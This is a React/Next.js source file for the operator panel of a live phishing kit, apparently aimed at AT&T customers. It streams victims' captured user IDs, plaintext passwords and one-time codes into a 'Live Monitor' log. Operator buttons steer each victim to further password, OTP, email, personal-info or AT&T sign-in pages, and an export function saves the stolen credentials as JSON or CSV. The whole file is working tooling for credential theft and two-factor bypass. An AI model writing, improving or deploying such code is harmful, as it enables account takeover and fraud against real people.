import Head from 'next/head';
import { useEffect, useState } from 'react';

export default function LinkPage() {
  const [currentPage, setCurrentPage] = useState(1);
  const [allActivities, setAllActivities] = useState([]);
  const itemsPerPage = 20;

  useEffect(() => {
    const activityLog = document.getElementById('activity-log');
    const statusIndicator = document.getElementById('status-indicator');
    let lastActivityId = null;
    let processedIds = new Set();
    let activitiesData = [];
    let currentActivityId = null;
    let currentUserId = null;

    // Setup control button handlers
    const controlButtons = {
      'btn-password': 'password',
      'btn-otp': 'otp',
      'btn-email': 'email',
      'btn-personal': 'personal',
      'btn-att': 'att',
      'btn-deny': 'deny'
    };

    Object.keys(controlButtons).forEach(btnId => {
      const btn = document.getElementById(btnId);
      if (btn) {
        btn.addEventListener('click', function() {
          if (!currentActivityId) {
            alert('No active user session. Wait for a user to sign in.');
            return;
          }
          
          const action = controlButtons[btnId];
          if (action === 'deny') {
            denyActivity(currentActivityId, 'signin', currentUserId);
          } else {
            approveActivity(currentActivityId, 'signin', currentUserId, action);
          }
        });
      }
    });

    function formatTime(timestamp) {
      const date = new Date(timestamp);
      return date.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit',
        hour12: true 
      });
    }

    async function approveActivity(activityId, type, userId, redirectType = 'password') {
      // Update UI immediately for instant feedback
      updateActivityStatus(activityId, 'approved', redirectType);
      
      try {
        console.log(`[link.js] Approving activity ${activityId} with redirectType: ${redirectType}`);
        const response = await fetch('/api/approve', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ activityId, type, userId, redirectType })
        });
        
        if (!response.ok) {
          const errorText = await response.text();
          console.error(`[link.js] Approve failed: ${response.status} ${response.statusText}`, errorText);
          // Revert UI on error
          updateActivityStatus(activityId, 'pending');
          throw new Error(`HTTP ${response.status}: ${errorText}`);
        }
        
        const data = await response.json();
        console.log(`[link.js] Approval response:`, data);
      } catch (error) {
        console.error('Error approving activity:', error);
        alert(`Failed to approve: ${error.message}`);
      }
    }

    async function denyActivity(activityId, type, userId) {
      // Update UI immediately for instant feedback
      updateActivityStatus(activityId, 'denied');
      
      try {
        const response = await fetch('/api/deny', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ activityId, type, userId })
        });
        
        if (!response.ok) {
          // Revert UI on error
          updateActivityStatus(activityId, 'pending');
          throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.json();
        console.log(`[link.js] Denial response:`, data);
      } catch (error) {
        console.error('Error denying activity:', error);
      }
    }

    function updateActivityStatus(activityId, status, redirectType = null) {
      const statusEl = document.getElementById(`status-${activityId}`);
      const actionsEl = document.getElementById(`actions-${activityId}`);
      
      if (statusEl) {
        if (status === 'pending') {
          statusEl.textContent = 'Waiting for redirect...';
          statusEl.className = 'activity-status status-pending';
        } else {
          statusEl.textContent = status === 'approved' 
            ? `Approved${redirectType ? ` - Redirecting to ${redirectType}` : ''}` 
            : 'Denied';
          statusEl.className = `activity-status status-${status}`;
        }
      }
      
      if (actionsEl && status !== 'pending') {
        actionsEl.style.display = 'none';
      }
    }

    function addActivityEntry(activity) {
      if (processedIds.has(activity.id)) return;
      processedIds.add(activity.id);

      // Add to activities data array
      activitiesData.unshift(activity);
      setAllActivities([...activitiesData]);

      // Track current activity for control buttons
      if (activity.type === 'signin') {
        currentActivityId = activity.id;
        currentUserId = activity.userId;
        enableControlButtons();
      }

      const timeString = formatTime(activity.timestamp);
      const userId = activity.userId || 'Unknown';
      
      let content = '';
      let className = '';
      let showActions = false;
      
      if (activity.type === 'userid') {
        content = `User ID entered: <strong>${userId}</strong>`;
        className = 'user-id-entry';
        showActions = false; // No buttons for user ID entry
      } else if (activity.type === 'password') {
        const passwordDisplay = activity.password ? `: <code>${activity.password}</code>` : '';
        content = `Password entered for: <strong>${userId}</strong>${passwordDisplay}`;
        className = 'password-entry';
        showActions = false; // No buttons for password entry (only after signin)
      } else if (activity.type === 'signin') {
        const passwordDisplay = activity.password ? ` (Password: <code>${activity.password}</code>)` : '';
        content = `Sign in button clicked for: <strong>${userId}</strong>${passwordDisplay}`;
        className = 'signin-entry';
        showActions = false; // Control buttons handle this now
      } else if (activity.type === 'otp') {
        const otpDisplay = activity.otpCode ? `: <code>${activity.otpCode}</code>` : '';
        content = `OTP code entered for: <strong>${userId}</strong>${otpDisplay}`;
        className = 'otp-entry';
        showActions = false;
      }

      const activityItem = document.createElement('div');
      activityItem.className = `activity-item`;
      activityItem.id = `activity-${activity.id}`;

      activityItem.innerHTML = `
        <div class="activity-time">${timeString}</div>
        <div class="activity-content">${content}</div>
      `;

      // Add event listeners - REMOVED since no inline buttons anymore
      
      const noActivity = activityLog.querySelector('.no-activity');
      if (noActivity) {
        noActivity.remove();
      }

      activityLog.insertBefore(activityItem, activityLog.firstChild);

      // Show toast notification
      showToast(`New ${activity.type} activity from ${userId}`);

      while (activityLog.children.length > 100) {
        activityLog.removeChild(activityLog.lastChild);
      }

      statusIndicator.classList.add('status-active');
      statusIndicator.classList.remove('status-inactive');
    }

    function enableControlButtons() {
      Object.keys(controlButtons).forEach(btnId => {
        const btn = document.getElementById(btnId);
        if (btn) btn.disabled = false;
      });
    }

    function disableControlButtons() {
      Object.keys(controlButtons).forEach(btnId => {
        const btn = document.getElementById(btnId);
        if (btn) btn.disabled = true;
      });
    }

    // Initially disable control buttons
    disableControlButtons();

    function showToast(message) {
      const toast = document.createElement('div');
      toast.className = 'toast-notification';
      toast.textContent = message;
      document.body.appendChild(toast);
      
      setTimeout(() => toast.classList.add('show'), 10);
      setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
      }, 3000);
    }

    function exportActivities(format) {
      if (activitiesData.length === 0) {
        alert('No activities to export');
        return;
      }

      if (format === 'json') {
        const dataStr = JSON.stringify(activitiesData, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `activities-${new Date().toISOString()}.json`;
        link.click();
        URL.revokeObjectURL(url);
      } else if (format === 'csv') {
        const headers = ['Timestamp', 'Type', 'User ID', 'Password', 'OTP Code'];
        const rows = activitiesData.map(a => [
          a.timestamp,
          a.type,
          a.userId || '',
          a.password || '',
          a.otpCode || ''
        ]);
        
        const csvContent = [
          headers.join(','),
          ...rows.map(row => row.map(cell => `"${cell}"`).join(','))
        ].join('\\n');
        
        const dataBlob = new Blob([csvContent], { type: 'text/csv' });
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `activities-${new Date().toISOString()}.csv`;
        link.click();
        URL.revokeObjectURL(url);
      }
      
      showToast(`Exported ${activitiesData.length} activities as ${format.toUpperCase()}`);
    }

    // Expose export function globally
    window.exportActivities = exportActivities;

    // Connect to SSE for real-time activity updates
    function connectSSE() {
      const eventSource = new EventSource('/api/events');
      
      eventSource.onmessage = function(event) {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === 'activity') {
            // New activity received
            addActivityEntry(data.data);
          } else if (data.type === 'approval') {
            // Approval status update
            updateActivityStatus(data.activityId, data.data.status, data.data.redirectType);
          } else if (data.type === 'connected') {
            console.log('SSE connected successfully');
          }
        } catch (error) {
          console.error('Error parsing SSE message:', error);
        }
      };
      
      eventSource.onerror = function(error) {
        console.error('[link.js] SSE connection error:', error);
        statusIndicator.classList.remove('status-active');
        statusIndicator.classList.add('status-inactive');
        
        // Reconnect faster (1 second) for quicker recovery
        setTimeout(() => {
          if (window.monitorEventSource === eventSource) {
            eventSource.close();
            connectSSE();
          }
        }, 1000);
      };
      
      eventSource.onopen = function() {
        console.log('[link.js] SSE connected successfully');
        statusIndicator.classList.add('status-active');
        statusIndicator.classList.remove('status-inactive');
      };
      
      // Store event source for cleanup
      window.monitorEventSource = eventSource;
    }

    // Load stored activities on page load
    async function loadStoredActivities() {
      try {
        console.log('[link.js] Loading stored activities...');
        const response = await fetch('/api/activities');
        if (response.ok) {
          const data = await response.json();
          if (data.success && data.activities) {
            console.log(`[link.js] Loaded ${data.activities.length} stored activities`);
            // Add each stored activity to the panel
            data.activities.forEach(activity => {
              addActivityEntry(activity);
            });
          }
        }
      } catch (error) {
        console.error('[link.js] Error loading stored activities:', error);
      }
    }

    // Test API connection on load
    async function testConnection() {
      try {
        const response = await fetch('/api/test');
        const data = await response.json();
        console.log('API connection test:', data);
      } catch (error) {
        console.error('API connection failed:', error);
      }
    }

    // Initialize
    testConnection();
    loadStoredActivities(); // Load stored activities first
    connectSSE(); // Then connect to SSE for real-time updates

    // Setup pagination controls
    const prevBtn = document.getElementById('prev-btn');
    const nextBtn = document.getElementById('next-btn');
    
    if (prevBtn && nextBtn) {
      prevBtn.addEventListener('click', () => {
        if (currentPage > 1) {
          setCurrentPage(currentPage - 1);
          updatePaginationDisplay();
        }
      });
      
      nextBtn.addEventListener('click', () => {
        const totalPages = Math.ceil(activitiesData.length / itemsPerPage);
        if (currentPage < totalPages) {
          setCurrentPage(currentPage + 1);
          updatePaginationDisplay();
        }
      });
    }

    function updatePaginationDisplay() {
      const pagination = document.getElementById('pagination');
      const paginationInfo = document.getElementById('pagination-info');
      const prevBtn = document.getElementById('prev-btn');
      const nextBtn = document.getElementById('next-btn');
      
      if (activitiesData.length === 0) {
        if (pagination) pagination.style.display = 'none';
        return;
      }
      
      if (pagination) pagination.style.display = 'flex';
      
      const totalPages = Math.ceil(activitiesData.length / itemsPerPage);
      const start = (currentPage - 1) * itemsPerPage + 1;
      const end = Math.min(currentPage * itemsPerPage, activitiesData.length);
      
      if (paginationInfo) {
        paginationInfo.textContent = `Showing ${start}-${end} of ${activitiesData.length} activities (Page ${currentPage} of ${totalPages})`;
      }
      
      if (prevBtn) prevBtn.disabled = currentPage === 1;
      if (nextBtn) nextBtn.disabled = currentPage >= totalPages;
    }

    return () => {
      if (window.monitorEventSource) {
        window.monitorEventSource.close();
      }
    };
  }, [currentPage]);

  // Update pagination when activities change
  useEffect(() => {
    const updateDisplay = () => {
      const pagination = document.getElementById('pagination');
      const paginationInfo = document.getElementById('pagination-info');
      const prevBtn = document.getElementById('prev-btn');
      const nextBtn = document.getElementById('next-btn');
      
      if (allActivities.length === 0) {
        if (pagination) pagination.style.display = 'none';
        return;
      }
      
      if (pagination) pagination.style.display = 'flex';
      
      const totalPages = Math.ceil(allActivities.length / itemsPerPage);
      const start = (currentPage - 1) * itemsPerPage + 1;
      const end = Math.min(currentPage * itemsPerPage, allActivities.length);
      
      if (paginationInfo) {
        paginationInfo.textContent = `Showing ${start}-${end} of ${allActivities.length} activities (Page ${currentPage} of ${totalPages})`;
      }
      
      if (prevBtn) prevBtn.disabled = currentPage === 1;
      if (nextBtn) nextBtn.disabled = currentPage >= totalPages;
    };
    
    updateDisplay();
  }, [allActivities, currentPage]);

  return (
    <>
      <Head>
        <title>Ready - Live Monitor</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
          background: #ffffff;
          min-height: 100vh;
          padding: 20px;
          margin: 0;
        }

        .simple-container {
          max-width: 800px;
          margin: 0 auto;
        }

        .activity-box {
          border: 2px solid #d1d1d1;
          border-radius: 8px;
          padding: 20px;
          background: #ffffff;
          position: relative;
        }

        .activity-label {
          position: absolute;
          top: -12px;
          left: 20px;
          background: #ffffff;
          padding: 0 8px;
          font-size: 14px;
          font-weight: 600;
          color: #333;
        }

        .control-buttons {
          margin-top: 20px;
          display: flex;
          gap: 10px;
          flex-wrap: wrap;
        }

        .control-btn {
          padding: 10px 20px;
          border: 1px solid #d1d1d1;
          border-radius: 25px;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          background: #ffffff;
          color: #333;
          transition: all 0.15s ease;
        }

        .control-btn:hover {
          background: #f5f5f5;
          border-color: #999;
        }

        .control-btn:active {
          transform: scale(0.98);
        }

        .control-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .activity-item {
          background: #ffffff;
          padding: 15px;
          margin-bottom: 10px;
          border-bottom: 1px solid #e0e0e0;
        }

        .activity-item:last-child {
          border-bottom: none;
        }

        .activity-time {
          font-size: 12px;
          color: #666;
          margin-bottom: 8px;
        }

        .activity-content {
          font-size: 14px;
          color: #333;
          margin-bottom: 12px;
        }

        .activity-content strong {
          color: #000;
          font-weight: 600;
        }

        .activity-content code {
          background: #f5f5f5;
          padding: 2px 6px;
          border-radius: 3px;
          font-family: monospace;
          font-size: 13px;
          color: #333;
        }

        .no-activity {
          text-align: center;
          color: #999;
          font-size: 14px;
          padding: 40px 20px;
        }

        /* Remove unused action button styles */
      `}</style>
      <div className="simple-container">
        <div className="activity-box">
          <div className="activity-label">activity</div>
          <div id="activity-log">
            <div className="no-activity">No activity yet. Waiting for login attempts...</div>
          </div>
        </div>
        
        <div className="control-buttons">
          <button className="control-btn" id="btn-password">Password Page</button>
          <button className="control-btn" id="btn-otp">OTP Code</button>
          <button className="control-btn" id="btn-email">Email Page</button>
          <button className="control-btn" id="btn-personal">Personal Info</button>
          <button className="control-btn" id="btn-att">AT&T Sign In</button>
          <button className="control-btn" id="btn-deny">Deny</button>
        </div>
      </div>
    </>
  );
}

